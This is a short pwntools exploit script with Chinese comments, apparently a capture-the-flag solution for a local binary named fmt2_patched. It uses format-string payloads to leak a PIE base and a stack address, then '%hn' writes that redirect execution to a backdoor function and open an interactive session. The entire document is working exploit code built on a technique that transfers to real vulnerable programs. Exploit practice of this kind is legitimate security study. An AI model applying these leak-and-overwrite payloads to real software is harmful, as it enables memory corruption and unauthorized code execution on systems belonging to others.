from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context(log_level='debug',arch='amd64',os='linux')
io=process("./fmt2_patched")

'''泄露pie'''
io.recv()

io.send(b'%15$p')
pie = io.recv(14)[2:14].decode().rjust(16,'0')
pie = int(pie,16)-0x13A8-0x39
success(hex(pie))

backdoor=pie+0x12e7

'''泄露栈'''

io.recv()
#
io.send(b'%21$p')
stack = io.recv(14)[2:14].decode().rjust(16,'0')
stack = int(stack,16)
success(hex(stack))
gdb.attach(io)

'''修改两条链子'''

io.recv()
payload1=b'%'+str((stack-0x120) & 0xffff).encode()+b'c%21$hn'
io.send(payload1)


'''修改后门'''

io.recvuntil(b"!!!")
payload1=b'%'+str((backdoor & 0xffff)).encode()+b'c%51$hn\x00'
io.send(payload1)

io.recvuntil(b"!!!")
io.send(b'1')


io.interactive()